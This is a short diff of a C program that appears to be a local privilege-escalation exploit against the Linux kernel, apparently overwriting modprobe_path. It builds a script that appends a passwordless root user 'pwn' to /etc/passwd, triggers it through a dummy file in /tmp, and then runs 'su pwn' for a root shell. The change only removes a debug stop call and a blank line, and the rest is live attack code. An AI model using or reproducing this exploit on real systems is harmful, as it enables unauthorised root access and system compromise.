@@ -119,7 +119,6 @@ int main(int argc, char const *argv[])
 
 	const char *new_path = "/tmp/x\x00";
 	uint64_t val = 0;
-
 	memcpy(&val, new_path, sizeof(uint64_t));
 
 	const char* script = "#!/bin/sh\necho \"pwn::0:0:root:/root:/bin/sh\" >> /etc/passwd";
@@ -129,8 +128,6 @@ int main(int argc, char const *argv[])
 	write_file("/tmp/dummy", (char*)magic, 0777);
 
 	write_fuel(val, 9);
-
-	stop("asd");
 
 	system("/tmp/dummy >/dev/null 2>&1");
 	system("su pwn 2>/dev/null");
